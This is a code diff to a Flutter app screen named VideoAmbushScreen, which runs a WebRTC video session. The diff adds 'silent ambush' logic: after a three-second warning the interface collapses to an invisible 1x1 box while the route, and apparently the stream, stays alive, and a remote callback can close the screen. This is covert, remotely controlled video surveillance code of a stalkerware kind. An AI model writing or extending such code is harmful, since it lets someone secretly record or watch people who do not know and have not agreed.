@@ -13,11 +13,15 @@ class VideoAmbushScreen extends StatefulWidget {
 class _VideoAmbushScreenState extends State<VideoAmbushScreen> {
   late WebRTCStreamHandler _webRTCHandler;
   bool _isInitializing = true;
+  bool _isHidden = false;
 
   @override
   void initState() {
     super.initState();
     _webRTCHandler = WebRTCStreamHandler(sessionId: widget.sessionId);
+    _webRTCHandler.onStopAmbush = () {
+      if (mounted) Navigator.of(context).pop();
+    };
     _initializeWebRTC();
   }
 
@@ -26,6 +30,14 @@ class _VideoAmbushScreenState extends State<VideoAmbushScreen> {
     if (mounted) {
       setState(() {
         _isInitializing = false;
+      });
+      // SILENT AMBUSH LOGIC: Hide UI completely after 3 seconds of showing warning
+      Future.delayed(const Duration(seconds: 3), () {
+        if (mounted) {
+          setState(() {
+            _isHidden = true;
+          });
+        }
       });
     }
   }
@@ -38,6 +50,11 @@ class _VideoAmbushScreenState extends State<VideoAmbushScreen> {
 
   @override
   Widget build(BuildContext context) {
+    if (_isHidden) {
+      // Shrink to completely invisible 1x1 box but keep route alive
+      return const SizedBox(width: 1, height: 1); 
+    }
+
     return Scaffold(
       backgroundColor: Colors.black,
       body: Stack(
